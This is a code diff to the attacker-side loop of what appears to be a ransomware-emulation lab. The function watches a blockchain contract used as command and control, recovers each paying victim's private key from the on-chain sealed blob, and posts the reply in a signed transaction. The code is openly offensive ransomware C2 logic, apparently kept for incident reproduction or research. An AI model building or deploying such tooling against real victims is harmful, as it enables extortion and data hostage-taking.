@@ -297,19 +297,22 @@ def attacker_watch(
     config: dict,
     attacker_keys_path: Path,
     chain_key_path: Path,
-    keylog_path: Path,
     start_id: int = 0,
 ) -> list:
     """Watch the chain, decrypt paid requests offline, and post replies.
 
     This is the full attacker loop the original incident needed a TOR C2
-    plus manual steps for: read the sealed blob, recover victim_priv with
-    attacker_priv, unseal the file key, seal both to the victim's ephemeral
+    plus manual steps for: read the sealed blob from the request itself,
+    recover victim_priv with attacker_priv, seal it to the victim's ephemeral
     key, and post the reply in one signed transaction.
+
+    The victim's keylog is NOT needed on the attacker machine: the on-chain
+    request already carries the sealed victim_priv blob, and the reply hands
+    back only victim_priv — the victim unseals its own file key locally.
+    This keeps the two-host split honest (host_1 never touches host_0 files).
     """
     attacker_keys = json.loads(attacker_keys_path.read_text(encoding="utf-8"))
     chain_account = load_chain_key(chain_key_path)
-    keylog = json.loads(keylog_path.read_text(encoding="utf-8"))
     address = discover_contract(config)
     # The contract only accepts submitReply from its deployer-designated
     # attacker. Verify locally first: a stale key otherwise burns gas on a
@@ -327,21 +330,22 @@ def attacker_watch(
     for entry in poll_requests(config, start_id):
         if entry["answered"]:
             continue
-        if entry["sealed_blob_json"] != json.dumps(keylog["victim_priv_sealed"]):
-            raise RuntimeError(
-                f"request {entry['id']} was sealed under a different attacker key; "
-                "this lab supports one host per attacker keylog"
-            )
-        # Offline crypto with attacker_priv: unseal victim_priv and file key.
+        # A minimal view over the ON-CHAIN blob: attacker_open_victim_priv
+        # verifies the blob was sealed under OUR attacker key and refuses
+        # otherwise (that check replaces the old local-keylog comparison).
+        keylog_view = {
+            "attacker_pub_pem": attacker_keys["attacker_pub_pem"],
+            "victim_priv_sealed": json.loads(entry["sealed_blob_json"]),
+        }
+        # Offline crypto with attacker_priv: recover victim_priv.
         victim_priv_pem = lab_keylogic.attacker_open_victim_priv(
-            unb64(attacker_keys["attacker_priv_pem"]), keylog
+            unb64(attacker_keys["attacker_priv_pem"]), keylog_view
         )
-        file_key = lab_keylogic.victim_open_file_key(victim_priv_pem, keylog)
         request = {
-            "participant_id": keylog["participant_id"],
+            "participant_id": "",
             "ephemeral_pub_b64": entry["ephemeral_pub_b64"],
         }
-        reply = lab_keylogic.attacker_build_reply(request, victim_priv_pem, file_key)
+        reply = lab_keylogic.attacker_build_reply(request, victim_priv_pem)
         sealed_reply = json.dumps(reply).encode("utf-8")
         data = (
             SELECTOR_SUBMIT_REPLY
